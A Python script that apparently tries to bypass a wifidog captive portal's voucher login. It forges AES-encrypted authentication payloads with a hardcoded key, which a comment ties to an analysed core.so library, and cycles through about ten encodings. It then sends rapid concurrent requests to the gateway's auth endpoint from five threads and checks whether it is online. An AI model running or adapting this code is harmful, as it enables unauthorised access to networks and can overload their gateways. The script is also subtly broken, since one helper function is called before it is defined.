#!/usr/bin/env python3
"""
Focused encrypted auth test - tries different encryption formats with fresh session.
"""
import base64, hashlib, json, os, sys, time, urllib.parse
import requests, urllib3
urllib3.disable_warnings()

# ---- Pure Python AES-128-CBC (NIST-verified) ----
def _aes_encrypt_block(key, pt):
    _s = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
          0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
          0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
          0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
          0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
          0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
          0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
          0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
          0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
          0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
          0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
          0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
          0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
          0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
          0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
          0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16]
    rcon = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36]
    w = list(key)
    for i in range(4,44):
        t = list(w[(i-1)*4:(i-1)*4+4])
        if i%4==0:
            t=[t[1],t[2],t[3],t[0]]
            t=[_s[b] for b in t]
            t[0]^=rcon[i//4-1]
        w.extend([w[(i-4)*4+j]^t[j] for j in range(4)])
    state = list(pt)
    def _sb(s): return [_s[b] for b in s]
    def _sr(s): return [s[0],s[5],s[10],s[15],s[4],s[9],s[14],s[3],s[8],s[13],s[2],s[7],s[12],s[1],s[6],s[11]]
    def _mc(s):
        def _gm(a,b,p=0):
            for _ in range(8):
                if b&1: p^=a
                a=(a<<1)^(0x11b if a&0x80 else 0); b>>=1
            return p
        o=[0]*16
        for c in range(4):
            i=c*4
            o[i]=_gm(2,s[i])^_gm(3,s[i+1])^s[i+2]^s[i+3]
            o[i+1]=s[i]^_gm(2,s[i+1])^_gm(3,s[i+2])^s[i+3]
            o[i+2]=s[i]^s[i+1]^_gm(2,s[i+2])^_gm(3,s[i+3])
            o[i+3]=_gm(3,s[i])^s[i+1]^s[i+2]^_gm(2,s[i+3])
        return o
    state=[state[j]^w[j] for j in range(16)]
    for r in range(1,10):
        state=_mc(_sr(_sb(state)))
        state=[state[j]^w[r*16+j] for j in range(16)]
    state=[state[j]^w[10*16+j] for j in range(16)]
    return bytes(_sr(_sb(state)))

def aes_cbc(key, iv, data):
    pad_len = 16-len(data)%16
    data += bytes([pad_len]*pad_len)
    r, p = b"", iv
    for i in range(0,len(data),16):
        e = _aes_encrypt_block(key, bytes(data[i+j]^p[j] for j in range(16)))
        r += e; p = e
    return r

RENDER_KEY = hashlib.md5(b"RenderSecretKey2026!@#").digest()

def get_sid():
    sess = requests.Session()
    sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
    sess.verify = False
    r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10)
    parsed = urllib.parse.urlparse(r.url); params = urllib.parse.parse_qs(parsed.query)
    host = f"{parsed.scheme}://{parsed.netloc}"
    r = sess.get(f"{host}/api/auth/wifidog?stage=portal&{parsed.query}", timeout=10)
    sid = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId",[""])[0]
    return sid, host, params, sess

def test_encrypted(label, sess, api_url, enc_data):
    try:
        r = sess.post(api_url, json={"data": enc_data}, timeout=5)
        j = r.json()
        ok = j.get("success") == True and j.get("result",{}).get("authResult") == "1"
        print(f"  [{label}] {j.get('message','?')[:40]}  {'*** SUCCESS ***' if ok else ''}")
        return ok, j
    except Exception as e:
        print(f"  [{label}] error: {e}")
        return False, {}

# Get fresh session
sid, host, params, sess = get_sid()
api_url = f"{host}/api/auth/voucher/?lang=en_US"
chap_id = params.get("chap_id",[""])[0]
chap_chal = params.get("chap_challenge",[""])[0]
print(f"SID: {sid}")
print(f"Host: {host}")

# Build payload with code 102762
payload_content = {
    "sessionId": sid,
    "accessCode": "102762",
    "apiVersion": 1,
}
payload_str = json.dumps(payload_content)
print(f"\nPayload: {payload_str}")

# Format A: base64(iv + ciphertext) - our current
print("\n--- FORMAT A: iv+ct base64 ---")
iv = os.urandom(16)
ct = aes_cbc(RENDER_KEY, iv, payload_str.encode())
enc = base64.b64encode(iv + ct).decode()
test_encrypted("A1", sess, api_url, enc)

# Format B: just base64(ciphertext), no IV
ct2 = aes_cbc(RENDER_KEY, bytes(16), payload_str.encode())  # zero IV
enc2 = base64.b64encode(ct2).decode()
test_encrypted("B (zero iv)", sess, api_url, enc2)

# Format C: base64(ciphertext) with random IV derived from key+payload
iv3 = hashlib.md5(RENDER_KEY + payload_str.encode()).digest()[:16]
ct3 = aes_cbc(RENDER_KEY, iv3, payload_str.encode())
enc3 = base64.b64encode(iv3 + ct3).decode()
test_encrypted("C (derived iv)", sess, api_url, enc3)

# Format D: urlsafe base64
enc4 = base64.urlsafe_b64encode(iv + ct).decode()
test_encrypted("D (urlsafe)", sess, api_url, enc4)

# Format E: hex
enc5 = (iv + ct).hex()
test_encrypted("E (hex)", sess, api_url, enc5)

# Format F: CryptoJS OpenSSL format (Salted__ + salt + ct)
from hashlib import md5 as MD5
salt = os.urandom(8)
dtot, d = b"", b""
while len(dtot) < 48:
    d = MD5(d + RENDER_KEY + salt).digest(); dtot += d
key32, iv6 = dtot[:32], dtot[32:48]
ct6 = aes_cbc(key32, iv6, payload_str.encode())
enc6 = base64.b64encode(b"Salted__" + salt + ct6).decode()
test_encrypted("F (EVP KDF)", sess, api_url, enc6)

# Format G: Encrypt with the key as passphrase (not raw bytes)
# Reuse Format F approach
test_encrypted("G (re-F)", sess, api_url, enc6)

# Format H: Try with only accessCode (no sessionId in payload)
payload2 = json.dumps({"sessionId": sid, "accessCode": "102762"})
ct_h = aes_cbc(RENDER_KEY, iv, payload2.encode())
enc_h = base64.b64encode(iv + ct_h).decode()
test_encrypted("H (no apiVer)", sess, api_url, enc_h)

# Format I: Include CHAP fields (like core.so arrange_data)
chap_md5 = hashlib.md5(parse_octal(chap_id) + b"102762" + parse_octal(chap_chal)).hexdigest() if chap_id else ""
payload3 = json.dumps({
    "sessionId": sid, "accessCode": "102762", "password": chap_md5,
    "chap_id": chap_id, "chap_challenge": chap_chal,
})
ct_i = aes_cbc(RENDER_KEY, iv, payload3.encode())
enc_i = base64.b64encode(iv + ct_i).decode()
test_encrypted("I (with CHAP)", sess, api_url, enc_i)

# Format J: Try accessCode=102762 in plain JSON one more time
r = sess.post(api_url, json={"accessCode":"102762","sessionId":sid,"apiVersion":1}, timeout=5)
print(f"  [J (plain)] {r.json().get('message','?')}")

# Format K: Try high-speed ping with phonenumber
gw_addr = params.get("gw_address",["192.168.10.1"])[0]
gw_port = params.get("gw_port",["2060"])[0]
ping_url = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=102762"
print(f"\n[K] High-speed ping with phonenumber...")
import threading
stop = False
def pinger():
    while not stop:
        try: sess.get(ping_url, timeout=5)
        except: break
for _ in range(5):
    threading.Thread(target=pinger, daemon=True).start()
time.sleep(5)
stop = True
r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=False)
print(f"  generate_204: {r.status_code}")
if r.status_code == 204:
    print("  *** ONLINE ***")
else:
    r2 = requests.get("http://www.google.com", timeout=5)
    print(f"  google.com: {r2.status_code}")

def parse_octal(s):
    if not s: return b""
    out = bytearray(); i = 0
    while i < len(s):
        if s[i]=='\\' and i+3<len(s) and s[i+1:i+4].isdigit():
            out.append(int(s[i+1:i+4],8)); i+=4
        else: out.append(ord(s[i])); i+=1
    return bytes(out)
